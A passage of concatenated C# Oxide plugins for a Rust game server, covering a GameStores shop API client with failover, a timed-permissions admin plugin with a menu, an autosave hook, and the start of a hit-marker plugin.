                        LogAction(null, $"[AutoCommands] Api не ответило на запрос: {GsProductId}");
                        LogAction(null, "Response code: 404, please check your configurations", true);
                        break;
                }
            }, null);
        }

        private Timer RestartTimer = null;
        private void SetReserveApiLink()
        {
            if (BaseRequest.Contains(MainApiLink))
            {
                LogAction(null, $"Trying use reserve api link", true);
                BaseRequest = ReserveApiLink + BaseRequestParams;
                if (!Initialized)
                    FetchShopUrl();
                timer.Once(300, () => {
                    TryChangeLink();
                });
            } else
            {
                LogAction(null, $"Plugin will automatically restart after 10 minutes", true);
                RestartTimer = timer.Once(600, () => { LogAction(null, $"Restarting...", true); Server.Command("o.reload GameStoresRUST"); });
            }                         
        }

        private void TryChangeLink()
        {
            string newLink = ReserveApiLink + BaseRequestParams;
            if (BaseRequest.Contains(ReserveApiLink))
            {
                newLink = MainApiLink + BaseRequestParams;
            }
            CheckRequest($"{newLink}&info=true", (code, response) =>
            {
                switch (code)
                {
                    case 200:
                        {
                            if (response.Length < 1)
                            {
                                return;
                            }
                            var firstInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(response, new KeyValuesConverter());
                            if (!firstInfo.ContainsKey("data"))
                            {
                                initialization = false;
                            }
                            else
                            {
                                if (RestartTimer != null)
                                {
                                    LogAction(null, $"Restart was canceled");
                                    RestartTimer.Destroy();
                                    RestartTimer = null;
                                }
                                LogAction(null, $"API link was changed", true);
                                BaseRequest = newLink;
                                if (!Initialized)
                                    FetchShopUrl();
                                if (BaseRequest.Contains(ReserveApiLink))
                                    timer.Once(600, () => { TryChangeLink(); });
                            }
                            break;
                        }
                    default:
                        break;

                }
            });
        }

        private void FetchShopUrl()
        {
            initialization = true;
            timer.Once(5, () => { initialization = false; });
            Request($"&info=true", (code, response) =>
            {
                LogAction(null, $"-----------------------------", true);
                LogAction(null, $" GameStores {Version} (c) 2019", true);
                try
                {
                    if (response.Length < 1)
                    {
                        LogToFile("!Errors", $"{DateTime.Now.ToShortTimeString()}| Response: '{response}'", this);
                        LogAction(null, " Incorrect API response! Saved to log!", true, true);
                        LogAction(null, $"-----------------------------", true);
                        SetReserveApiLink();
                        initialization = false;
                        return;
                    }
                    var firstInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(response, new KeyValuesConverter());
                    if (!firstInfo.ContainsKey("data"))
                    {
                        LogAction(null, $"     Wrong Secret Key", true, true);
                        LogAction(null, $"-----------------------------", true);
                        initialization = false;
                    }
                    else
                    { 
                        firstInfo = firstInfo["data"] as Dictionary<string, object>;
                        ShopURL = firstInfo["link"].ToString();
                        StartBalance = int.Parse(firstInfo["default_balance"].ToString());
                        LogAction(null, "      Initialized - OK", true);
                        LogAction(null, $"-----------------------------", true);
                        //BasePlayer.activePlayerList.ForEach(OnPlayerInit);
                        foreach (var pl in BasePlayer.activePlayerList)
                        {
                            OnPlayerConnected(pl);
                        }

                        Initialized = true;
                        initialization = false;
                    }
                }
                catch (JsonException e)
                {
                    
                    LogToFile("Errors", $"{DateTime.Now.ToShortTimeString()}| JsonError | Response: '{response}'", this);
                    LogAction(null, " JSON Error! Saved to log!", true, true);
                    LogAction(null, $"-----------------------------", true);
                    SetReserveApiLink();
                    initialization = false;
                }

            });
        }

        private static int errorsReq = 0;
        private static void Request(string ask, Action<int, string> callback, BasePlayer player = null, bool cancel = true)
        {
            if (player != null && !Delays.CanRequest(player))
            {
                instance.ShowNotify(player, "Вы делаете слишком много запросов к серверу!\n" +
                    "Подождите <b>одну секунду</b>!");
                instance.timer.Once(1f, () =>
                {
                    CuiHelper.DestroyUi(player, StoreLayer + ".Notify");
                    Request(ask, callback, player, cancel);
                });

                return;
            };
            if (player != null) ServerMgr.Instance.StartCoroutine(Delays.MakeRequest(player));
            Dictionary<string, string> reqHeaders = new Dictionary<string, string>{{ "User-Agent", "GameStores Plugin" }};
            
            instance.webrequest.Enqueue(instance.BaseRequest + ask, "", (code, response) =>
            {
                if (instance == null) return;
                
                switch (code)
                {
                    case 200:
                        {
                            break;
                        }
                    default:
                        {
                            instance.LogAction(null, $"Time out waiting for GS API #1");
                            errorsReq++;
                            
                            if (errorsReq >= 10)
                            {
                                errorsReq = 0;
                                instance.TryChangeLink();
                            }
                            
                            break;
                        }
                    case 404:
                        {
                            instance.LogAction(null, $"Please check your configuration! [404] #2", true);
                            break;
                        }
                }

                if (player != null && cancel) Delays.FinishRequest(player);

                callback?.Invoke(code, response);
            }, instance, RequestMethod.GET, reqHeaders);
                      
        }
        private static void CheckRequest(string link, Action<int, string> callback)
        {   
            Dictionary<string, string> reqHeaders = new Dictionary<string, string> { { "User-Agent", "GameStores Plugin" } };
            instance.webrequest.Enqueue(link, "", (code, response) =>
            {
                if (instance == null) return;

                switch (code)
                {
                    case 0:
                        {
                            
                            break;
                        }
                    case 404:
                        {
                            
                            break;
                        }
                }

                callback?.Invoke(code, response);
            }, instance, RequestMethod.GET, reqHeaders);

        }

        private static void RequestPost(string ask, Action<int, string> callback, BasePlayer player = null, bool cancel = true)
        {
            if (player != null && !Delays.CanRequest(player))
            {
                instance.ShowNotify(player, "Вы делаете слишком много запросов к серверу!\n" +
                    "Подождите <b>одну секунду</b>!");
                instance.timer.Once(1f, () =>
                {
                    CuiHelper.DestroyUi(player, StoreLayer + ".Notify");
                    RequestPost(ask, callback, player, cancel);
                });
                return;
            };
            if (player != null) ServerMgr.Instance.StartCoroutine(Delays.MakeRequest(player));
            string body, reqLink;
            int pos = instance.BaseRequest.IndexOf("?");
            if (pos < 0)
            {
                body = ask;
                reqLink = instance.BaseRequest;
            }
            else
            {
                reqLink = instance.BaseRequest.Substring(0, pos);
                body = $"{instance.BaseRequest.Substring(pos + 1)}{ask}";
            }
            Dictionary<string, string> reqHeaders = new Dictionary<string, string> { { "User-Agent", "GameStores Plugin" } };
            instance.webrequest.Enqueue(reqLink, body, (code, response) =>
            {
                if (instance == null) return;

                switch (code)
                {
                    case 0:
                        {
                            instance.PrintError($"Time out waiting for GS API #1");
                            break;
                        }
                    case 404:
                        {
                            instance.PrintError($"Plese check your configuration! [404] #2");
                            break;
                        }
                }
                if (player != null && cancel) Delays.FinishRequest(player);

                callback?.Invoke(code, response);
            }, instance, RequestMethod.POST, reqHeaders);
        }

        private void LogAction(BasePlayer player, string text, bool printToConsole = false, bool printError = false)
        {
            LogToFile($"!global", $"{DateTime.Now.ToShortTimeString()} {(player != null ? "[" + player.userID + "]" : " ")}{text}", this);

            if (printToConsole)
                if (printError)
                    instance.PrintError($"{text}");
                else 
                    PrintWarning($"{text}");
            if (player != null)
                LogPlayerAction(player, text);
        }
        private void LogPlayerAction(BasePlayer player, string text) => LogToFile($"{player.userID}", $"{DateTime.Now.ToShortTimeString()} {text}", this);
        private static double CurrentTime() => DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;

        #endregion
    }
}

// --- End of file: GameStoresRUST.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/TimedPermissions.cs ---
// --- Original Local Path: HudRust/TimedPermissions.cs ---

using System.Text.RegularExpressions;
using Oxide.Core.Libraries.Covalence;
using System.Collections.Generic;
using Newtonsoft.Json.Linq;
using System.Linq;
using System;
using Newtonsoft.Json;
using Oxide.Game.Rust.Cui;
using UnityEngine;
using System.Globalization;
using Oxide.Core.Plugins;

namespace Oxide.Plugins
{
    [Info("Timed Permissions", "LaserHydra", "1.4.0", ResourceId = 1926)]
    [Description("Allows you to grant permissions or groups for a specific time")]
    internal class TimedPermissions : CovalencePlugin
    {
        [PluginReference] Plugin XMenu;
        private const string AdminPermission = "timedpermissions.use";
        private const string AdvancedAdminPermission = "timedpermissions.advanced";

        private static TimedPermissions _instance;
        private static List<Player> _players = new List<Player>();

        private Configuration _config;
        
        #region Hooks & Loading

        private void Loaded()
        {
            _instance = this;

            MigrateData();

            LoadData(ref _players);

            if (_players == null)
            {
                _players = new List<Player>();
                SaveData(_players);
            }
        }

        #region Layers
        public const string MenuLayer = "XMenu";
        public const string MenuItemsLayer = "XMenu.MenuItems";
        public const string MenuSubItemsLayer = "XMenu.MenuSubItems";
        public const string MenuContent = "XMenu.Content";
        #endregion

        public Dictionary<string, string> NicePerms = new Dictionary<string, string>()
        {
            ["blueprintmanager.all"] = "Это название я сам настроил"
        };

        Timer TimerInitialize;
        private void OnServerInitialized()
        {
            NicePerms = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<Dictionary<string, string>>("NicePerms");
            TimerInitialize = timer.Every(5f, () =>
            {
                if (XMenu.IsLoaded)
                {
                    XMenu.Call("API_RegisterSubMenu", this.Name, "Main", "Привилегии", "RenderPermissions", null);
                    TimerInitialize.Destroy();
                }
            });
        }

        private void Unload()
        {
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("NicePerms", NicePerms);
        }

        private void RenderPermissions(ulong userID, object[] objects)
        {
            CuiElementContainer Container = (CuiElementContainer)objects[0];
            bool FullRender = (bool)objects[1];
            string Name = (string)objects[2];
            int ID = (int)objects[3];
            int Page = (int)objects[4];

            Container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-215 -230",
                            OffsetMax = "500 270"
                        },
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info",
                Parent = MenuContent,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat("#0000007f"),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "80 -460",
                            OffsetMax = "630 -10"
                        }
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Title",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = $"<color=#F65050>Список ваших привилегий</color>",
                                Align = TextAnchor.MiddleCenter,
                                FontSize = 24,
                                Font = "robotocondensed-regular.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.05 0.9",
                                AnchorMax = "0.975 0.975",
                            },
                            new CuiOutlineComponent()
                            {
                                 Color = "0 0 0 1",
                                 Distance = "0.5 -0.5"
                            }
                        }
            });
            Player player = Player.Get(userID.ToString());
            if (player != null)
            {
                int j = 1;
                for (int i = 0; i < player.Groups.Count; i++)
                {
                    if (!player.Groups.ElementAt(i).Expired)
                    { 
                        Container.Add(new CuiElement
                        {
                            Parent = MenuContent + ".Info",
                            Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"{j}. <color=#F65050>" + (NicePerms.ContainsKey(player.Groups.ElementAt(i).Value) ? NicePerms[player.Groups.ElementAt(i).Value] : player.Groups.ElementAt(i).Value) + "</color> до " + player.Groups.ElementAt(i).ExpireDate.ToString("dd/MM/yyyy HH:mm"),
                                    Align = TextAnchor.MiddleLeft,
                                    FontSize = 16,
                                    Font = "robotocondensed-regular.ttf",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"30 {-50 - j * 25}",
                                    OffsetMax = $"550 {-25 - j * 25}"
                                }
                            }
                        });
                        j++;
                    }
                }

                for (int i = 0; i < player.Permissions.Count; i++)
                {
                    if (!player.Permissions.ElementAt(i).Expired)
                    {
                        Container.Add(new CuiElement
                        {
                            Parent = MenuContent + ".Info",
                            Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"{j}. <color=#90BD47>" + (NicePerms.ContainsKey(player.Permissions.ElementAt(i).Value) ? NicePerms[player.Permissions.ElementAt(i).Value] : player.Permissions.ElementAt(i).Value) + "</color> до " + player.Permissions.ElementAt(i).ExpireDate.ToString("dd/MM/yyyy HH:mm"),
                                    Align = TextAnchor.MiddleLeft,
                                    FontSize = 16,
                                    Font = "robotocondensed-regular.ttf",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"30 {-50 - j * 25}",
                                    OffsetMax = $"550 {-25 - j * 25}"
                                }
                            }
                        });
                        j++;
                    }
                }
            }
        }

        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return $"{color.r:F2} {color.g:F2} {color.b:F2} {color.a:F2}";
        }

        private void OnNewSave(string filename)
        {
            LoadConfig(); // Ensure config is loaded at this point

            if (_config.WipeDataOnNewSave)
            {
                string backupFileName;
                ResetAllAccess(out backupFileName);

                PrintWarning($"New save file detected: all groups and permissions revoked and data cleared. Backup created at {backupFileName}");
            }
        }

        private void MigrateData()
        {
            List<JObject> data = new List<JObject>();
            LoadData(ref data);

            if (data == null)
                return;

            foreach (JObject playerData in data)
            {
                if (playerData["permissions"] != null)
                {
                    JArray permissions = (JArray) playerData["permissions"];
                    
                    foreach (JObject obj in permissions)
                    {
                        if (obj["permission"] != null)
                        {
                            obj["Value"] = obj["permission"]; 
                            obj.Remove("permission");
                        }

                        if (obj["_expireDate"] != null)
                        {
                            string expireDate = obj["_expireDate"].Value<string>();
                            
                            int[] date = (from val in expireDate.Split('/') select Convert.ToInt32(val)).ToArray(); 
                            obj["ExpireDate"] = new DateTime(date[4], date[3], date[2], date[1], date[0], 0);

                            obj.Remove("_expireDate");
                        }
                    }
                    
                    playerData["Permissions"] = permissions;
                    playerData.Remove("permissions");
                }

                if (playerData["groups"] != null)
                {
                    JArray permissions = (JArray)playerData["groups"];
                    
                    foreach (JObject obj in permissions)
                    {
                        if (obj["group"] != null)
                        {
                            obj["Value"] = obj["group"];
                            obj.Remove("group");
                        }

                        if (obj["_expireDate"] != null)
                        {
                            string expireDate = obj["_expireDate"].Value<string>();

                            int[] date = (from val in expireDate.Split('/') select Convert.ToInt32(val)).ToArray();
                            obj["ExpireDate"] = new DateTime(date[4], date[3], date[2], date[1], date[0], 0);

                            obj.Remove("_expireDate"); 
                        }
                    }

                    playerData["Groups"] = permissions;
                    playerData.Remove("groups");
                }

                if (playerData["steamID"] != null)
                {
                    playerData["Id"] = playerData["steamID"];
                    playerData.Remove("steamID");
                }

                if (playerData["name"] != null)
                {
                    playerData["Name"] = playerData["name"];
                    playerData.Remove("name");
                }
            }

            SaveData(data);
        }

        #endregion

        #region Commands

        [Command("pinfo")]
        private void CmdPlayerInfo(IPlayer player, string cmd, string[] args)
        {
            IPlayer target;

            if (args.Length == 0 || !player.HasPermission(AdminPermission))
                target = player;
            else
                target = FindPlayer(args[0], player);

            if (target == null)
                return;

            var pl = Player.Get(target.Id);

            if (pl == null)
                player.Reply(GetMessage("Player Has No Info", player.Id));
            else
            {
                string msg = GetMessage("Player Info", player.Id);

                msg = msg.Replace("{player}", $"{pl.Name} ({pl.Id})");
                msg = msg.Replace("{groups}", string.Join(", ", (from g in pl.Groups select $"{g.Value} until {g.ExpireDate.ToLongDateString() + " " + g.ExpireDate.ToShortTimeString()} UTC").ToArray()));
                msg = msg.Replace("{permissions}", string.Join(", ", (from p in pl.Permissions select $"{p.Value} until {p.ExpireDate.ToLongDateString() + " " + p.ExpireDate.ToShortTimeString()} UTC").ToArray()));

                player.Reply(msg);
            }
        }

        [Command("revokeperm"), Permission(AdminPermission)]
        private void CmdRevokePerm(IPlayer player, string cmd, string[] args)
        {
            if (args.Length != 2)
            {
                player.Reply($"Syntax: {(player.LastCommand == CommandType.Console ? string.Empty : "/")}revokeperm <player|steamid> <permission>");
                return;
            }

            IPlayer target = FindPlayer(args[0], player);

            if (target == null)
                return;

            Player pl = Player.Get(target.Id);
            
            if (pl == null || !pl.Permissions.Any(p => p.Value == args[1].ToLower()))
            {
                player.Reply(GetMessage("User Doesn't Have Permission", player.Id).Replace("{target}", target.Name).Replace("{permission}", args[1].ToLower()));
                return;
            }

            pl.RemovePermission(args[1].ToLower());
        }

        [Command("grantperm"), Permission(AdminPermission)]
        private void CmdGrantPerm(IPlayer player, string cmd, string[] args)
        {
            if (args.Length != 3)
            {
                player.Reply($"Syntax: {(player.LastCommand == CommandType.Console ? string.Empty : "/")}grantperm <player|steamid> <permission> <time Ex: 1d12h30m>");
                return;
            }

            IPlayer target = FindPlayer(args[0], player);
            TimeSpan duration;

            if (target == null)
                return;

            if (!TryParseTimeSpan(args[2], out duration))
            {
                player.Reply(GetMessage("Invalid Time Format", player.Id));
                return;
            }

            Player.GetOrCreate(target).AddPermission(args[1].ToLower(), DateTime.UtcNow + duration);
        }

        [Command("removegroup"), Permission(AdminPermission)]
        private void CmdRemoveGroup(IPlayer player, string cmd, string[] args)
        {
            if (args.Length != 2)
            {
                player.Reply($"Syntax: {(player.LastCommand == CommandType.Console ? string.Empty : "/")}removegroup <player|steamid> <group>");
                return;
            }

            IPlayer target = FindPlayer(args[0], player);

            if (target == null)
                return;

            Player pl = Player.Get(target.Id);

            if (pl == null || !pl.Groups.Any(p => p.Value == args[1].ToLower()))
            {
                player.Reply(GetMessage("User Isn't In Group", player.Id).Replace("{target}", target.Name).Replace("{group}", args[1].ToLower()));
                return;
            }

            pl.RemoveGroup(args[1].ToLower());
        }

        [Command("addgroup"), Permission(AdminPermission)]
        private void CmdAddGroup(IPlayer player, string cmd, string[] args)
        {
            if (args.Length != 3)
            {
                player.Reply($"Syntax: {(player.LastCommand == CommandType.Console ? string.Empty : "/")}addgroup <player|steamid> <group> <time Ex: 1d12h30m>");
                return;
            }

            IPlayer target = FindPlayer(args[0], player);
            TimeSpan duration;

            if (target == null)
                return;

            if (!TryParseTimeSpan(args[2], out duration))
            {
                player.Reply(GetMessage("Invalid Time Format", player.Id));
                return;
            }

            Player.GetOrCreate(target).AddGroup(args[1], DateTime.UtcNow + duration);
        }

        [Command("timedpermissions_resetaccess"), Permission(AdvancedAdminPermission)]
        private void CmdResetAccess(IPlayer player, string cmd, string[] args)
        {
            if (args.Length != 1 || !args[0].Equals("yes", StringComparison.InvariantCultureIgnoreCase))
            {
                player.Reply("Syntax: timedpermissions_resetaccess [yes]");
                player.Reply("This command will reset all access data and create a backup. Please confirm by calling the command with 'yes' as parameter");

                return;
            }

            string backupFileName;
            ResetAllAccess(out backupFileName);

            player.Reply($"All groups and permissions revoked and data cleared. Backup created at {backupFileName}");
        }

        [Command("timedpermissions_ensureaccess"), Permission(AdvancedAdminPermission)]
        private void CmdEnsureAccess(IPlayer player, string cmd, string[] args)
        {
            if (args.Length != 1 || !args[0].Equals("yes", StringComparison.InvariantCultureIgnoreCase))
            {
                player.Reply("Syntax: timedpermissions_ensureaccess [yes]");
                player.Reply("This command will ensure every player has their permissions and groups assigned. Please confirm by calling the command with 'yes' as parameter");

                return;
            }

            foreach (Player playerInformation in _players)
                playerInformation.EnsureAllAccess();

            player.Reply("All players were ensured to have their permissions and groups assigned.");
        }

        #endregion

        #region Helper Methods

        private void ResetAllAccess(out string backupFileName)
        {
            backupFileName = $"{nameof(TimedPermissions)}_Backups/{DateTime.UtcNow.Date:yyyy-MM-dd}_{DateTime.UtcNow:T}";
            SaveData(_players, backupFileName); // create backup of current data

            foreach (Player playerInformation in _players)
                playerInformation.RemoveAllAccess();

            _players = new List<Player>();
            SaveData(_players);
        }

        #region Time Helper

        private bool TryParseTimeSpan(string source, out TimeSpan date)
        {
            int minutes = 0;
            int hours = 0;
            int days = 0;

            Match m = new Regex(@"(\d+?)m", RegexOptions.IgnoreCase).Match(source);
            Match h = new Regex(@"(\d+?)h", RegexOptions.IgnoreCase).Match(source);
            Match d = new Regex(@"(\d+?)d", RegexOptions.IgnoreCase).Match(source);

            if (m.Success)
                minutes = Convert.ToInt32(m.Groups[1].ToString());

            if (h.Success)
                hours = Convert.ToInt32(h.Groups[1].ToString());

            if (d.Success)
                days = Convert.ToInt32(d.Groups[1].ToString());

            source = source.Replace(minutes + "m", string.Empty);
            source = source.Replace(hours + "h", string.Empty);
            source = source.Replace(days + "d", string.Empty);

            if (!string.IsNullOrEmpty(source) || (!m.Success && !h.Success && !d.Success))
            {
                date = default(TimeSpan);
                return false;
            }

            date = new TimeSpan(days, hours, minutes, 0);
            return true;
        }

        #endregion

        #region Finding Helper

        private IPlayer FindPlayer(string nameOrId, IPlayer player)
        {
            if (IsConvertibleTo<ulong>(nameOrId) && nameOrId.StartsWith("7656119") && nameOrId.Length == 17)
            {
                IPlayer result = players.All.ToList().Find(p => p.Id == nameOrId);

                if (result == null)
                    player.Reply($"Could not find player with ID '{nameOrId}'");

                return result;
            }

            List<IPlayer> foundPlayers = new List<IPlayer>();

            foreach (IPlayer current in players.Connected)
            {
                if (string.Equals(current.Name, nameOrId, StringComparison.CurrentCultureIgnoreCase))
                    return current;

                if (current.Name.ToLower().Contains(nameOrId.ToLower()))
                    foundPlayers.Add(current);
            }

            switch (foundPlayers.Count)
            {
                case 0:
                    player.Reply($"Could not find player with name '{nameOrId}'");
                    break;

                case 1:
                    return foundPlayers[0];

                default:
                    string[] names = (from current in foundPlayers select current.Name).ToArray();
                    player.Reply("Multiple matching players found: \n" + string.Join(", ", names));
                    break;
            }

            return null;
        }

        #endregion

        #region Conversion Helper

        private static bool IsConvertibleTo<T>(object s)
        {
            try
            {
                var parsed = (T)Convert.ChangeType(s, typeof(T));
                return true;
            }
            catch
            {
                return false;
            }
        }

        #endregion

        #region Data Helper

        private static void LoadData<T>(ref T data, string filename = null) =>
            data = Core.Interface.Oxide.DataFileSystem.ReadObject<T>(filename ?? nameof(TimedPermissions));

        private static void SaveData<T>(T data, string filename = null) =>
            Core.Interface.Oxide.DataFileSystem.WriteObject(filename ?? nameof(TimedPermissions), data);

        #endregion

        #region Message Wrapper

        public static string GetMessage(string key, string id) => _instance.lang.GetMessage(key, _instance, id);

        #endregion

        #endregion

        #region Localization

        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                {"No Permission", "You don't have permission to use this command."},
                {"Invalid Time Format", "Invalid Time Format: Ex: 1d12h30m | d = days, h = hours, m = minutes"},
                {"Player Has No Info", "There is no info about this player."},
                {"Player Info", $"Info about <color=#C4FF00>{{player}}</color>:{Environment.NewLine}<color=#C4FF00>Groups</color>: {{groups}}{Environment.NewLine}<color=#C4FF00>Permissions</color>: {{permissions}}"},
                {"User Doesn't Have Permission", "{target} does not have permission '{permission}'."},
                {"User Isn't In Group", "{target} isn't in group '{group}'."},
            }, this);
        }

        #endregion

        #region Configuration

        protected override void LoadConfig()
        {
            base.LoadConfig();
            _config = Config.ReadObject<Configuration>();
            SaveConfig();
        }

        protected override void LoadDefaultConfig() => _config = new Configuration();

        protected override void SaveConfig() => Config.WriteObject(_config);

        private class Configuration
        {
            [JsonProperty("Wipe Data on New Save (Limited to Certain Games)")]
            public bool WipeDataOnNewSave { get; private set; } = false;
        }

        #endregion

        #region Data Structures

        // TODO: do general refactoring & improvements
        private class Player
        {
            public readonly List<TimedAccessValue> Permissions = new List<TimedAccessValue>();
            public readonly List<TimedAccessValue> Groups = new List<TimedAccessValue>();
            public string Name = "unknown";
            public string Id = "0";

            internal static Player Get(string steamId) => _players.Find(p => p.Id == steamId);

            internal static Player GetOrCreate(IPlayer player)
            {
                Player pl = Get(player.Id);

                if (pl == null)
                {
                    pl = new Player(player);

                    _players.Add(pl);
                    SaveData(_players);
                }

                return pl;
            }

            public TimedAccessValue GetTimedPermission(string permission) => Permissions.Find(p => p.Value == permission);

            public TimedAccessValue GetTimedGroup(string group) => Groups.Find(g => g.Value == group);

            public void AddPermission(string permission, DateTime expireDate)
            {
                TimedAccessValue existingPermission = GetTimedPermission(permission);

                if (existingPermission != null)
                {
                    existingPermission.ExpireDate += expireDate - DateTime.UtcNow;

                    _instance.Puts($"----> {Name} ({Id}) - Permission Extended: {permission} to {existingPermission.ExpireDate - DateTime.UtcNow}" + Environment.NewLine);
                }
                else
                {
                    Permissions.Add(new TimedAccessValue(permission, expireDate));
                    _instance.permission.GrantUserPermission(Id, permission, null);

                    _instance.Puts($"----> {Name} ({Id}) - Permission Granted: {permission} for {expireDate - DateTime.UtcNow}" + Environment.NewLine);
                }

                SaveData(_players);
            }

            internal void AddGroup(string group, DateTime expireDate)
            {
                TimedAccessValue existingGroup = GetTimedGroup(group);

                if (existingGroup != null)
                {
                    existingGroup.ExpireDate += expireDate - DateTime.UtcNow;

                    _instance.Puts($"----> {Name} ({Id}) - Group Time Extended: {group} to {existingGroup.ExpireDate - DateTime.UtcNow}" + Environment.NewLine);
                }
                else
                {
                    Groups.Add(new TimedAccessValue(group, expireDate));
                    _instance.permission.AddUserGroup(Id, group);

                    _instance.Puts($"----> {Name} ({Id}) - Added to Group: {group} for {expireDate - DateTime.UtcNow}" + Environment.NewLine);
                }

                SaveData(_players);
            }

            internal void RemovePermission(string permission)
            {
                Permissions.Remove(GetTimedPermission(permission));
                _instance.permission.RevokeUserPermission(Id, permission);

                _instance.Puts($"----> {Name} ({Id}) - Permission Expired: {permission}" + Environment.NewLine);

                if (Groups.Count == 0 && Permissions.Count == 0)
                    _players.Remove(this);

                SaveData(_players);
            }

            internal void RemoveGroup(string group)
            {
                Groups.Remove(GetTimedGroup(group));
                _instance.permission.RemoveUserGroup(Id, group);

                _instance.Puts($"----> {Name} ({Id}) - Group Expired: {group}" + Environment.NewLine);

                if (Groups.Count == 0 && Permissions.Count == 0)
                    _players.Remove(this);

                SaveData(_players);
            }

            public void RemoveAllAccess()
            {
                foreach (TimedAccessValue group in Groups)
                    _instance.permission.RemoveUserGroup(Id, group.Value);

                Groups.Clear();

                foreach (TimedAccessValue permission in Permissions)
                    _instance.permission.RevokeUserPermission(Id, permission.Value);

                Permissions.Clear();
            }

            public void EnsureAllAccess()
            {
                foreach (TimedAccessValue group in Groups)
                    _instance.permission.AddUserGroup(Id, group.Value);

                foreach (TimedAccessValue permission in Permissions)
                    _instance.permission.GrantUserPermission(Id, permission.Value, null);
            }

            private void Update()
            {
                foreach (TimedAccessValue perm in Permissions.ToList())
                    if (perm.Expired)
                        RemovePermission(perm.Value);

                foreach (TimedAccessValue group in Groups.ToList())
                    if (group.Expired)
                        RemoveGroup(group.Value);
            }

            public override int GetHashCode() => Id.GetHashCode();

            private Player(IPlayer player)
            {
                Id = player.Id;
                Name = player.Name;

                _instance.timer.Repeat(60, 0, Update);
            }

            public Player()
            {
                _instance.timer.Repeat(60, 0, Update);
            }
        }

        // TODO: do general refactoring & improvements
        private class TimedAccessValue
        {
            public string Value = string.Empty;
            public DateTime ExpireDate;

            internal bool Expired => DateTime.Compare(DateTime.UtcNow, ExpireDate) > 0;

            public override int GetHashCode() => Value.GetHashCode();

            internal TimedAccessValue(string value, DateTime expireDate)
            {
                Value = value;
                ExpireDate = expireDate;
            }

            public TimedAccessValue()
            {
            }
        }

        #endregion
    }
}

// --- End of file: TimedPermissions.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/AutoSaver.cs ---
// --- Original Local Path: HudRust/AutoSaver.cs ---

using Oxide.Core;

namespace Oxide.Plugins
{
    [Info("AutoSaver", "walkinrey", "1.0.0")]
    [Description("Сохраняет сервер прежде чем он выключится :)")]
    class AutoSaver : RustPlugin
    {
        void OnServerShutdown() => covalence.Server.Command("save");
    }
}

// --- End of file: AutoSaver.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/HitMarker.cs ---
// --- Original Local Path: HudRust/HitMarker.cs ---

﻿// Reference: System.Drawing
using Facepunch;
using Oxide.Core.Configuration;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using Rust;
using System;
using System.Collections.Generic;
using UnityEngine;
using Oxide.Core;
using Random = System.Random;
using Time = UnityEngine.Time;

namespace Oxide.Plugins
{
    [Info("HitMarker", "Rust-Plugin.ru", "1.0.2")]
    class HitMarker : RustPlugin
    {
        #region CONFIGURATION

        private bool Changed;
        private bool enablesound;
        private string soundeffect;
        private string headshotsoundeffect;
        private float damageTimeout;
		
        object GetConfig(string menu, string datavalue, object defaultValue)
        {
            var data = Config[menu] as Dictionary<string, object>;
            if (data == null)
            {
                data = new Dictionary<string, object>();
                Config[menu] = data;
                Changed = true;
            }
            object value;
            if (!data.TryGetValue(datavalue, out value))
            {
                value = defaultValue;
                data[datavalue] = value;
                Changed = true;
            }
            return value;
        }        

        protected override void LoadDefaultConfig()
        {
            enablesound = Convert.ToBoolean( GetConfig( "Sound", "EnableSoundEffect", true ) );
            soundeffect =
                Convert.ToString( GetConfig( "Sound", "Sound Effect", "assets/bundled/prefabs/fx/takedamage_hit.prefab" ) );
            headshotsoundeffect =
                Convert.ToString( GetConfig( "Sound", "HeadshotSoundEffect", "assets/bundled/prefabs/fx/headshot.prefab" ) );
            GetVariable(Config, "Через сколько будет пропадать урон", out damageTimeout, 0.5f );
            SaveConfig();
        }
        public static void GetVariable<T>( DynamicConfigFile config, string name, out T value, T defaultValue )
        {
            config[ name ] = value = config[ name ] == null ? defaultValue : (T) Convert.ChangeType( config[ name ], typeof( T ) );
        }
        #endregion
        
        #region FIELDS

        [PluginReference] private Plugin Clans;
        
		Random rnd = new Random();
		
        List<BasePlayer> hitmarkeron = new List<BasePlayer>();

